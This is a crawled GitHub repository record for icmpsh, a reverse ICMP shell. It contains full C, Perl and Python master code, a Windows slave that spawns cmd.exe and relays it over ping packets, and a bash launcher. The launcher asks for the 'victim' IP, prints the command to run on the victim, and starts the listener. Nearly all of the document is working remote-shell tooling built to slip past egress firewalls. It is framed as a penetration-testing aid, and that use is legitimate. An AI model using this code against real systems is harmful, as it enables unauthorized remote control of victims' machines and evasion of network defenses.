{
  "metadata": {
    "timestamp": 1736710234463,
    "page": 969,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjk3MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "bdamele/icmpsh",
      "stars": 1564,
      "defaultBranch": "master",
      "files": [
        {
          "name": "README.md",
          "type": "blob",
          "size": 3.859375,
          "content": "## Background\r\n\r\nSometimes, network administrators make the penetration tester's life harder. Some of them do use firewalls for what they are meant to, surprisingly!\r\nAllowing traffic only onto known machines, ports and services (ingress filtering) and setting strong egress access control lists is one of these cases. In such scenarios when you have owned a machine part of the internal network or the DMZ (e.g. in a Citrix breakout engagement or similar), it is not always trivial to get a reverse shell over TCP, not to consider a bind shell.\r\n\r\nHowever, what about UDP (commonly a DNS tunnel) or ICMP as the channel to get a reverse shell? ICMP is the focus on this tool.\r\n\r\n## Description\r\n\r\nicmpsh is a simple reverse ICMP shell with a win32 slave and a POSIX compatible master in C, Perl or Python. The main advantage over the other similar open source tools is that it does not require administrative privileges to run onto the target machine.\r\n\r\nThe tool is clean, easy and portable. The **slave (client) runs on the target Windows machine**, it is written in C and works on Windows only whereas the **master (server) can run on any platform on the attacker machine** as it has been implemented in C and Perl by [Nico Leidecker](http://www.leidecker.info/) and I have ported it to Python too, hence this GitHub fork.\r\n\r\n## Features\r\n\r\n* Open source software - primarily coded by Nico, forked by me.\r\n* Client/server architecture.\r\n* The master is portable across any platform that can run either C, Perl or Python code.\r\n* The target system has to be Windows because the slave runs on that platform only for now.\r\n* The user running the slave on the target system does not require administrative privileges.\r\n\r\n## Usage\r\n\r\n### Running the master\r\n\r\nThe master is straight forward to use. There are no extra libraries required for the C and Python versions. The Perl master however has the following dependencies:\r\n\r\n* IO::Socket\r\n* NetPacket::IP\r\n* NetPacket::ICMP\r\n\r\nWhen running the master, don't forget to disable ICMP replies by the OS. For example:\r\n```\r\nsysctl -w net.ipv4.icmp_echo_ignore_all=1\r\n```\r\n\r\nIf you miss doing that, you will receive information from the slave, but the slave is unlikely to receive commands send from the master.\r\n\r\n### Running the slave\r\n\r\nThe slave comes with a few command line options as outlined below:\r\n\r\n```\r\n-t host            host ip address to send ping requests to. This option is mandatory!\r\n\r\n-r                 send a single test icmp request containing the string \"Test1234\" and then quit. \r\n                   This is for testing the connection.\r\n\r\n-d milliseconds    delay between requests in milliseconds \r\n\r\n-o milliseconds    timeout of responses in milliseconds. If a response has not received in time, \r\n                   the slave will increase a counter of blanks. If that counter reaches a limit, the slave will quit.\r\n                   The counter is set back to 0 if a response was received.\r\n\r\n-b num             limit of blanks (unanswered icmp requests before quitting\r\n\r\n-s bytes           maximal data buffer size in bytes\r\n```\r\n\r\nIn order to improve the speed, lower the delay (*-d*) between requests or increase the size (-s) of the data buffer.\r\n\r\n## License\r\n\r\nThis source code is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version.\r\n\r\nThis library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details.\r\n\r\nYou should have received a copy of the GNU Lesser General Public License along with this library; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA\r\n"
        },
        {
          "name": "icmpsh-m.c",
          "type": "blob",
          "size": 3.8720703125,
          "content": "/*\r\n *   icmpsh - simple icmp command shell\r\n *   Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>\r\n *   This program is free software: you can redistribute it and/or modify\r\n *   it under the terms of the GNU General Public License as published by\r\n *   the Free Software Foundation, either version 3 of the License, or\r\n *   (at your option) any later version.\r\n *\r\n *    This program is distributed in the hope that it will be useful,\r\n *    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n *    GNU General Public License for more details.\r\n *\r\n *    You should have received a copy of the GNU General Public License\r\n *    along with this program.  If not, see <http://www.gnu.org/licenses/>.\r\n */\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <sys/stat.h>\r\n#include <netinet/in.h>\r\n#include <netinet/ip_icmp.h>\r\n#include <netinet/ip.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n\r\n#define IN_BUF_SIZE   1024\r\n#define OUT_BUF_SIZE  64\r\n\r\n// calculate checksum\r\nunsigned short checksum(unsigned short *ptr, int nbytes)\r\n{\r\n    unsigned long sum;\r\n    unsigned short oddbyte, rs;\r\n\r\n    sum = 0;\r\n    while(nbytes > 1) {\r\n        sum += *ptr++;\r\n        nbytes -= 2;\r\n    }\r\n\r\n    if(nbytes == 1) {\r\n        oddbyte = 0;\r\n        *((unsigned char *) &oddbyte) = *(u_char *)ptr;\r\n        sum += oddbyte;\r\n    }\r\n\r\n    sum  = (sum >> 16) + (sum & 0xffff);\r\n    sum += (sum >> 16);\r\n    rs = ~sum;\r\n    return rs;\r\n}\r\n\r\nint main(int argc, char **argv)\r\n{\r\n    int sockfd;\r\n    int flags;\r\n    char in_buf[IN_BUF_SIZE];\r\n    char out_buf[OUT_BUF_SIZE];\r\n    unsigned int out_size;\r\n    int nbytes;\r\n    struct iphdr *ip;\r\n    struct icmphdr *icmp;\r\n    char *data;\r\n    struct sockaddr_in addr;\r\n\r\n\r\n    printf(\"icmpsh - master\\n\");\r\n    \r\n    // create raw ICMP socket\r\n    sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);\r\n    if (sockfd == -1) {\r\n       perror(\"socket\");\r\n       return -1;\r\n    }\r\n\r\n    // set stdin to non-blocking\r\n    flags = fcntl(0, F_GETFL, 0);\r\n    flags |= O_NONBLOCK;\r\n    fcntl(0, F_SETFL, flags);\r\n\r\n    printf(\"running...\\n\");\r\n    while(1) {\r\n\r\n        // read data from socket\r\n        memset(in_buf, 0x00, IN_BUF_SIZE);\r\n        nbytes = read(sockfd, in_buf, IN_BUF_SIZE - 1);\r\n        if (nbytes > 0) {\r\n            // get ip and icmp header and data part\r\n            ip = (struct iphdr *) in_buf;\r\n            if (nbytes > sizeof(struct iphdr)) {\r\n                nbytes -= sizeof(struct iphdr);\r\n                icmp = (struct icmphdr *) (ip + 1);\r\n                if (nbytes > sizeof(struct icmphdr)) {\r\n                    nbytes -= sizeof(struct icmphdr);\r\n                    data = (char *) (icmp + 1);\r\n                    data[nbytes] = '\\0';\r\n                    printf(\"%s\", data);\r\n                    fflush(stdout);\r\n                }\r\n                \r\n                // reuse headers\r\n                icmp->type = 0;\r\n                addr.sin_family = AF_INET;\r\n                addr.sin_addr.s_addr = ip->saddr;\r\n        \r\n                // read data from stdin\r\n                nbytes = read(0, out_buf, OUT_BUF_SIZE);\r\n                if (nbytes > -1) {\r\n                    memcpy((char *) (icmp + 1), out_buf, nbytes);\r\n                    out_size = nbytes;\r\n                } else {\r\n                    out_size = 0;\r\n                }\r\n\r\n                icmp->checksum = 0x00;\r\n                icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + out_size);\r\n\r\n                // send reply\r\n                nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + out_size, 0, (struct sockaddr *) &addr, sizeof(addr));\r\n                if (nbytes == -1) {\r\n                    perror(\"sendto\");\r\n                    return -1;\r\n                }        \r\n            }\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n"
        },
        {
          "name": "icmpsh-m.pl",
          "type": "blob",
          "size": 2.0859375,
          "content": "#!/usr/bin/env perl\n#\n#  icmpsh - simple icmp command shell\n#  Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n\n\n\nuse strict;\nuse IO::Socket;\nuse NetPacket::IP;\nuse NetPacket::ICMP qw(ICMP_ECHOREPLY ICMP_ECHO);\nuse Net::RawIP;\nuse Fcntl;\n\nprint \"icmpsh - master\\n\";\n\n# create raw socket\nmy $sock = IO::Socket::INET->new(\n                Proto   => \"ICMP\",\n                Type    => SOCK_RAW,\n                Blocking => 1) or die \"$!\";\n\n# set stdin to non-blocking\nfcntl(STDIN, F_SETFL, O_NONBLOCK) or die \"$!\";\n\nprint \"running...\\n\";\n\nmy $input = '';\nwhile(1) {\n        if ($sock->recv(my $buffer, 4096, 0)) {\n                my $ip = NetPacket::IP->decode($buffer);\n                my $icmp = NetPacket::ICMP->decode($ip->{data});\n                if ($icmp->{type} == ICMP_ECHO) {\n                        # get identifier and sequencenumber\n                        my ($ident,$seq,$data) = unpack(\"SSa*\", $icmp->{data});\n\n                        # write data to stdout and read from stdin\n                        print $data;\n                        $input = <STDIN>;\n\n                        # compile and send response\n                        $icmp->{type} = ICMP_ECHOREPLY;\n                        $icmp->{data} = pack(\"SSa*\", $ident, $seq, $input);\n                        my $raw = $icmp->encode();\n                        my $addr = sockaddr_in(0, inet_aton($ip->{src_ip}));\n                        $sock->send($raw, 0, $addr) or die \"$!\\n\";\n                }\n        }\n}\n"
        },
        {
          "name": "icmpsh-s.c",
          "type": "blob",
          "size": 9.146484375,
          "content": "/*\r\n *   icmpsh - simple icmp command shell\r\n *   Copyright (c) 2010, Nico Leidecker <nico@leidecker.info>\r\n *   This program is free software: you can redistribute it and/or modify\r\n *   it under the terms of the GNU General Public License as published by\r\n *   the Free Software Foundation, either version 3 of the License, or\r\n *   (at your option) any later version.\r\n *\r\n *    This program is distributed in the hope that it will be useful,\r\n *    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n *    GNU General Public License for more details.\r\n *\r\n *    You should have received a copy of the GNU General Public License\r\n *    along with this program.  If not, see <http://www.gnu.org/licenses/>.\r\n */\r\n\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <winsock2.h>\r\n#include <windows.h>\r\n#include <winsock2.h>\r\n#include <iphlpapi.h>\r\n\r\n#define ICMP_HEADERS_SIZE\t(sizeof(ICMP_ECHO_REPLY) + 8)\r\n\r\n#define STATUS_OK\t\t\t\t\t0\r\n#define STATUS_SINGLE\t\t\t\t1\r\n#define STATUS_PROCESS_NOT_CREATED\t2\r\n\r\n#define TRANSFER_SUCCESS\t\t\t1\r\n#define TRANSFER_FAILURE\t\t\t0\r\n\r\n#define DEFAULT_TIMEOUT\t\t\t    3000\r\n#define DEFAULT_DELAY\t\t\t    200\r\n#define DEFAULT_MAX_BLANKS\t   \t    10\r\n#define DEFAULT_MAX_DATA_SIZE\t    64\r\n\r\nFARPROC icmp_create, icmp_send, to_ip;\r\n\r\nint verbose = 0;\r\n\r\nint spawn_shell(PROCESS_INFORMATION *pi, HANDLE *out_read, HANDLE *in_write)\r\n{\r\n\tSECURITY_ATTRIBUTES sattr;\r\n\tSTARTUPINFOA si;\r\n\tHANDLE in_read, out_write;\r\n\r\n\tmemset(&si, 0x00, sizeof(SECURITY_ATTRIBUTES));\r\n\tmemset(pi, 0x00, sizeof(PROCESS_INFORMATION));\r\n    \r\n\t// create communication pipes  \r\n\tmemset(&sattr, 0x00, sizeof(SECURITY_ATTRIBUTES));\r\n\tsattr.nLength = sizeof(SECURITY_ATTRIBUTES); \r\n\tsattr.bInheritHandle = TRUE; \r\n\tsattr.lpSecurityDescriptor = NULL; \r\n\r\n\tif (!CreatePipe(out_read, &out_write, &sattr, 0)) {\r\n\t\treturn STATUS_PROCESS_NOT_CREATED;\r\n\t}\r\n\tif (!SetHandleInformation(*out_read, HANDLE_FLAG_INHERIT, 0)) {\r\n\t\treturn STATUS_PROCESS_NOT_CREATED;\r\n\t}\r\n\r\n\tif (!CreatePipe(&in_read, in_write, &sattr, 0)) {\r\n\t\treturn STATUS_PROCESS_NOT_CREATED;\r\n\t}\r\n\tif (!SetHandleInformation(*in_write, HANDLE_FLAG_INHERIT, 0)) {\r\n\t\treturn STATUS_PROCESS_NOT_CREATED;\r\n\t}\r\n\r\n\t// spawn process\r\n\tmemset(&si, 0x00, sizeof(STARTUPINFO));\r\n\tsi.cb = sizeof(STARTUPINFO); \r\n\tsi.hStdError = out_write;\r\n\tsi.hStdOutput = out_write;\r\n\tsi.hStdInput = in_read;\r\n\tsi.dwFlags |= STARTF_USESTDHANDLES;\r\n\r\n\tif (!CreateProcessA(NULL, \"cmd\", NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA) &si, pi)) {\r\n\t\treturn STATUS_PROCESS_NOT_CREATED;\r\n\t}\r\n\r\n\tCloseHandle(out_write);\r\n\tCloseHandle(in_read);\r\n\r\n\treturn STATUS_OK;\r\n}\r\n\r\nvoid usage(char *path)\r\n{\r\n\tprintf(\"%s [options] -t target\\n\", path);\r\n\tprintf(\"options:\\n\");\r\n\tprintf(\"  -t host            host ip address to send ping requests to\\n\");\r\n\tprintf(\"  -r                 send a single test icmp request and then quit\\n\");\r\n\tprintf(\"  -d milliseconds    delay between requests in milliseconds (default is %u)\\n\", DEFAULT_DELAY);\r\n\tprintf(\"  -o milliseconds    timeout in milliseconds\\n\");\r\n\tprintf(\"  -h                 this screen\\n\");\r\n\tprintf(\"  -b num             maximal number of blanks (unanswered icmp requests)\\n\");\r\n    printf(\"                     before quitting\\n\");\r\n\tprintf(\"  -s bytes           maximal data buffer size in bytes (default is 64 bytes)\\n\\n\", DEFAULT_MAX_DATA_SIZE);\r\n\tprintf(\"In order to improve the speed, lower the delay (-d) between requests or\\n\");\r\n    printf(\"increase the size (-s) of the data buffer\\n\");\r\n}\r\n\r\nvoid create_icmp_channel(HANDLE *icmp_chan)\r\n{\r\n\t// create icmp file\r\n\t*icmp_chan = (HANDLE) icmp_create();\r\n}\r\n\r\nint transfer_icmp(HANDLE icmp_chan, unsigned int target, char *out_buf, unsigned int out_buf_size, char *in_buf, unsigned int *in_buf_size, unsigned int max_in_data_size, unsigned int timeout)\r\n{\r\n\tint rs;\r\n\tchar *temp_in_buf;\r\n\tint nbytes;\r\n\r\n\tPICMP_ECHO_REPLY echo_reply;\r\n\r\n\ttemp_in_buf = (char *) malloc(max_in_data_size + ICMP_HEADERS_SIZE);\r\n\tif (!temp_in_buf) {\r\n\t\treturn TRANSFER_FAILURE;\r\n\t}\r\n\r\n\t// send data to remote host\r\n\trs = icmp_send(\r\n\t\t\ticmp_chan,\r\n\t\t\ttarget,\r\n\t\t\tout_buf,\r\n\t\t\tout_buf_size,\r\n\t\t\tNULL,\r\n\t\t\ttemp_in_buf,\r\n\t\t\tmax_in_data_size + ICMP_HEADERS_SIZE,\r\n\t\t\ttimeout);\r\n\r\n\t\t// check received data\r\n\t\tif (rs > 0) {\r\n\t\t\techo_reply = (PICMP_ECHO_REPLY) temp_in_buf;\r\n\t\t\tif (echo_reply->DataSize > max_in_data_size) {\r\n\t\t\t\tnbytes = max_in_data_size;\r\n\t\t\t} else {\r\n\t\t\t\tnbytes = echo_reply->DataSize;\r\n\t\t\t}\r\n\t\t\tmemcpy(in_buf, echo_reply->Data, nbytes);\r\n\t\t\t*in_buf_size = nbytes;\r\n\r\n\t\t\tfree(temp_in_buf);\r\n\t\t\treturn TRANSFER_SUCCESS;\r\n\t\t}\r\n\r\n\t\tfree(temp_in_buf);\r\n\r\n    return TRANSFER_FAILURE;\r\n}\r\n\r\nint load_deps()\r\n{\r\n\tHMODULE lib;\r\n\t\r\n\tlib = LoadLibraryA(\"ws2_32.dll\");\r\n\tif (lib != NULL) {\r\n        to_ip = GetProcAddress(lib, \"inet_addr\");\r\n        if (!to_ip) {   \r\n            return 0;\r\n        }\r\n    }\r\n\r\n\tlib = LoadLibraryA(\"iphlpapi.dll\");\r\n\tif (lib != NULL) {\r\n\t\ticmp_create = GetProcAddress(lib, \"IcmpCreateFile\");\r\n\t\ticmp_send = GetProcAddress(lib, \"IcmpSendEcho\");\r\n\t\tif (icmp_create && icmp_send) {\r\n\t\t\treturn 1;\r\n\t\t}\r\n\t} \r\n\r\n\tlib = LoadLibraryA(\"ICMP.DLL\");\r\n\tif (lib != NULL) {\r\n\t\ticmp_create = GetProcAddress(lib, \"IcmpCreateFile\");\r\n\t\ticmp_send = GetProcAddress(lib, \"IcmpSendEcho\");\r\n\t\tif (icmp_create && icmp_send) {\r\n\t\t\treturn 1;\r\n\t\t}\r\n\t}\r\n\t\r\n\tprintf(\"failed to load functions (%u)\", GetLastError());\r\n\r\n\treturn 0;\r\n}\r\nint main(int argc, char **argv)\r\n{\r\n\tint opt;\r\n\tchar *target;\r\n\tunsigned int delay, timeout;\r\n\tunsigned int ip_addr;\r\n\tHANDLE pipe_read, pipe_write;\r\n\tHANDLE icmp_chan;\r\n\tunsigned char *in_buf, *out_buf;\r\n\tunsigned int in_buf_size, out_buf_size;\r\n\tDWORD rs;\r\n\tint blanks, max_blanks;\r\n\tPROCESS_INFORMATION pi;\r\n\tint status;\r\n\tunsigned int max_data_size;\r\n\tstruct hostent *he;\r\n\r\n\r\n\t// set defaults\r\n\ttarget = 0;\r\n\ttimeout = DEFAULT_TIMEOUT;\r\n\tdelay = DEFAULT_DELAY;\r\n\tmax_blanks = DEFAULT_MAX_BLANKS;\r\n\tmax_data_size = DEFAULT_MAX_DATA_SIZE;\r\n\r\n\tstatus = STATUS_OK;\r\n\tif (!load_deps()) {\r\n\t\tprintf(\"failed to load ICMP library\\n\");\r\n\t\treturn -1;\r\n\t}\r\n\r\n\t// parse command line options\r\n\tfor (opt = 1; opt < argc; opt++) {\r\n\t\tif (argv[opt][0] == '-') {\r\n\t\t\tswitch(argv[opt][1]) {\r\n\t\t\t\tcase 'h':\r\n\t\t\t\t    usage(*argv);\r\n\t\t\t\t\treturn 0;\r\n\t\t\t\tcase 't':\r\n\t\t\t\t\tif (opt + 1 < argc) {\r\n\t\t\t\t\t\ttarget = argv[opt + 1];\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 'd':\r\n\t\t\t\t\tif (opt + 1 < argc) {\r\n\t\t\t\t\t\tdelay = atol(argv[opt + 1]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 'o':\r\n\t\t\t\t\tif (opt + 1 < argc) {\r\n\t\t\t\t\t\ttimeout = atol(argv[opt + 1]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 'r':\r\n\t\t\t\t\tstatus = STATUS_SINGLE;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 'b':\r\n\t\t\t\t\tif (opt + 1 < argc) {\r\n\t\t\t\t\t\tmax_blanks = atol(argv[opt + 1]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tcase 's':\r\n\t\t\t\t\tif (opt + 1 < argc) {\r\n\t\t\t\t\t\tmax_data_size = atol(argv[opt + 1]);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\tdefault:\r\n\t\t\t\t\tprintf(\"unrecognized option -%c\\n\", argv[1][0]);\r\n\t\t\t\t\tusage(*argv);\r\n\t\t\t\t\treturn -1;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tif (!target) {\r\n\t\tprintf(\"you need to specify a host with -t. Try -h for more options\\n\");\r\n\t\treturn -1;\r\n\t}\r\n\tip_addr = to_ip(target);\r\n\r\n\t// don't spawn a shell if we're only sending a single test request\r\n\tif (status != STATUS_SINGLE) {\r\n\t\tstatus = spawn_shell(&pi, &pipe_read, &pipe_write);\r\n\t}\r\n\r\n\t// create icmp channel\r\n\tcreate_icmp_channel(&icmp_chan);\r\n\tif (icmp_chan == INVALID_HANDLE_VALUE) {\r\n\t    printf(\"unable to create ICMP file: %u\\n\", GetLastError());\r\n\t    return -1;\r\n\t}\r\n\r\n\t// allocate transfer buffers\r\n\tin_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);\r\n\tout_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);\r\n\tif (!in_buf || !out_buf) {\r\n\t\tprintf(\"failed to allocate memory for transfer buffers\\n\");\r\n\t\treturn -1;\r\n\t}\r\n\tmemset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);\r\n\tmemset(out_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE);\r\n\r\n\t// sending/receiving loop\r\n\tblanks = 0;\r\n\tdo {\r\n\r\n\t\tswitch(status) {\r\n\t\t\tcase STATUS_SINGLE:\r\n\t\t\t\t// reply with a static string\r\n\t\t\t\tout_buf_size = sprintf(out_buf, \"Test1234\\n\");\r\n\t\t\t\tbreak;\r\n\t\t\tcase STATUS_PROCESS_NOT_CREATED:\r\n\t\t\t\t// reply with error message\r\n\t\t\t\tout_buf_size = sprintf(out_buf, \"Process was not created\\n\");\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\t// read data from process via pipe\r\n\t\t\t\tout_buf_size = 0;\r\n\t\t\t\tif (PeekNamedPipe(pipe_read, NULL, 0, NULL, &out_buf_size, NULL)) {\r\n\t\t\t\t\tif (out_buf_size > 0) {\r\n\t\t\t\t\t\tout_buf_size = 0;\r\n\t\t\t\t\t\trs = ReadFile(pipe_read, out_buf, max_data_size, &out_buf_size, NULL);\r\n\t\t\t\t\t\tif (!rs && GetLastError() != ERROR_IO_PENDING) {\r\n\t\t\t\t\t\t\tout_buf_size = sprintf(out_buf, \"Error: ReadFile failed with %i\\n\", GetLastError());\r\n\t\t\t\t\t\t} \r\n\t\t\t\t\t}\r\n\t\t\t\t} else {\r\n\t\t\t\t\tout_buf_size = sprintf(out_buf, \"Error: PeekNamedPipe failed with %i\\n\", GetLastError());\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\t// send request/receive response\r\n\t\tif (transfer_icmp(icmp_chan, ip_addr, out_buf, out_buf_size, in_buf, &in_buf_size,  max_data_size, timeout) == TRANSFER_SUCCESS) {\r\n\t\t\tif (status == STATUS_OK) {\r\n\t\t\t\t// write data from response back into pipe\r\n\t\t\t\tWriteFile(pipe_write, in_buf, in_buf_size, &rs, 0);\r\n\t\t\t}\r\n\t\t\tblanks = 0;\r\n\t\t} else {\r\n\t\t\t// no reply received or error occured\r\n\t\t\tblanks++;\r\n\t\t}\r\n\r\n\t\t// wait between requests\r\n\t\tSleep(delay);\r\n\r\n\t} while (status == STATUS_OK && blanks < max_blanks);\r\n\r\n\tif (status == STATUS_OK) {\r\n\t\tTerminateProcess(pi.hProcess, 0);\r\n\t}\r\n\r\n    return 0;\r\n}\r\n\r\n"
        },
        {
          "name": "icmpsh.exe",
          "type": "blob",
          "size": 18.5869140625,
          "content": null
        },
        {
          "name": "icmpsh_m.py",
          "type": "blob",
          "size": 4.3466796875,
          "content": "#!/usr/bin/env python\n#\n#  icmpsh - simple icmp command shell (port of icmpsh-m.pl written in\n#  Perl by Nico Leidecker <nico@leidecker.info>)\n#\n#  Copyright (c) 2010, Bernardo Damele A. G. <bernardo.damele@gmail.com>\n#\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport select\nimport socket\nimport subprocess\nimport sys\n\ndef setNonBlocking(fd):\n    \"\"\"\n    Make a file descriptor non-blocking\n    \"\"\"\n\n    import fcntl\n\n    flags = fcntl.fcntl(fd, fcntl.F_GETFL)\n    flags = flags | os.O_NONBLOCK\n    fcntl.fcntl(fd, fcntl.F_SETFL, flags)\n\ndef main(src, dst):\n    if subprocess.mswindows:\n        sys.stderr.write('icmpsh master can only run on Posix systems\\n')\n        sys.exit(255)\n\n    try:\n        from impacket import ImpactDecoder\n        from impacket import ImpactPacket\n    except ImportError:\n        sys.stderr.write('You need to install Python Impacket library first\\n')\n        sys.exit(255)\n\n    # Make standard input a non-blocking file\n    stdin_fd = sys.stdin.fileno()\n    setNonBlocking(stdin_fd)\n\n    # Open one socket for ICMP protocol\n    # A special option is set on the socket so that IP headers are included\n    # with the returned data\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    except socket.error, e:\n        sys.stderr.write('You need to run icmpsh master with administrator privileges\\n')\n        sys.exit(1)\n\n    sock.setblocking(0)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Create a new IP packet and set its source and destination addresses\n    ip = ImpactPacket.IP()\n    ip.set_ip_src(src)\n    ip.set_ip_dst(dst)\n\n    # Create a new ICMP packet of type ECHO REPLY\n    icmp = ImpactPacket.ICMP()\n    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)\n\n    # Instantiate an IP packets decoder\n    decoder = ImpactDecoder.IPDecoder()\n\n    while 1:\n        cmd = ''\n\n        # Wait for incoming replies\n        if sock in select.select([ sock ], [], [])[0]:\n            buff = sock.recv(4096)\n\n            if 0 == len(buff):\n                # Socket remotely closed\n                sock.close()\n                sys.exit(0)\n\n            # Packet received; decode and display it\n            ippacket = decoder.decode(buff)\n            icmppacket = ippacket.child()\n\n            # If the packet matches, report it to the user\n            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():\n                # Get identifier and sequence number\n                ident = icmppacket.get_icmp_id()\n                seq_id = icmppacket.get_icmp_seq()\n                data = icmppacket.get_data_as_string()\n\n                if len(data) > 0:\n                    sys.stdout.write(data)\n\n                # Parse command from standard input\n                try:\n                    cmd = sys.stdin.readline()\n                except:\n                    pass\n\n                if cmd == 'exit\\n':\n                    return\n\n                # Set sequence number and identifier\n                icmp.set_icmp_id(ident)\n                icmp.set_icmp_seq(seq_id)\n\n                # Include the command as data inside the ICMP packet\n                icmp.contains(ImpactPacket.Data(cmd))\n\n                # Calculate its checksum\n                icmp.set_icmp_cksum(0)\n                icmp.auto_checksum = 1\n\n                # Have the IP packet contain the ICMP packet (along with its payload)\n                ip.contains(icmp)\n\n                # Send it to the target host\n                sock.sendto(ip.get_packet(), (dst, 0))\n\nif __name__ == '__main__':\n    if len(sys.argv) < 3:\n        msg = 'missing mandatory options. Execute as root:\\n'\n        msg += './icmpsh-m.py <source IP address> <destination IP address>\\n'\n        sys.stderr.write(msg)\n        sys.exit(1)\n\n    main(sys.argv[1], sys.argv[2])\n"
        },
        {
          "name": "run.sh",
          "type": "blob",
          "size": 2.087890625,
          "content": "#!/usr/bin/env bash\n# icmp shell script\n# Daniel Compton\n# 05/2013\necho \"\"\necho \"\"\necho -e \"\\e[00;32m##################################################################\\e[00m\"\necho \"\"\necho \"ICMP Shell Automation Script for\"\necho \"\"\necho \"https://github.com/inquisb/icmpsh\"\necho \"\"\necho -e \"\\e[00;32m##################################################################\\e[00m\"\n\necho \"\"\nIPINT=$(ifconfig | grep \"eth\" | cut -d \" \" -f 1 | head -1)\nIP=$(ifconfig \"$IPINT\" |grep \"inet addr:\" |cut -d \":\" -f 2 |awk '{ print $1 }')\necho -e \"\\e[1;31m-------------------------------------------------------------------\\e[00m\"\necho -e \"\\e[01;31m[?]\\e[00m What is the victims public IP address?\"\necho -e \"\\e[1;31m-------------------------------------------------------------------\\e[00m\"\nread VICTIM\necho \"\"\necho -e \"\\e[01;32m[-]\\e[00m Run the following code on your victim system on the listender has started:\"\necho \"\"\necho -e \"\\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\\e[00m\"\necho \"\"\necho \"icmpsh.exe -t \"$IP\" -d 500 -b 30 -s 128\"\necho \"\"\necho -e \"\\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\\e[00m\"\necho \"\"\nLOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)\nif [ \"$LOCALICMP\" -eq 0 ]\n                then \n                                echo \"\"\n                                echo -e \"\\e[01;32m[-]\\e[00m Local ICMP Replies are currently enabled, I will disable these temporarily now\"\n                                sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null\n                                ICMPDIS=\"disabled\"\n                else\n                                echo \"\"\nfi\necho \"\"\necho -e \"\\e[01;32m[-]\\e[00m Launching Listener...,waiting for a inbound connection..\"\necho \"\"\npython icmpsh_m.py \"$IP\" \"$VICTIM\"\nif [ \"$ICMPDIS\" = \"disabled\" ]\n                then\n                                echo \"\"\n                                echo -e \"\\e[01;32m[-]\\e[00m Enabling Local ICMP Replies again now\"\n                                sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null\n                                echo \"\"\n                else\n                                echo \"\"\nfi\n\nexit 0\n\n"
        },
        {
          "name": "screenshots",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}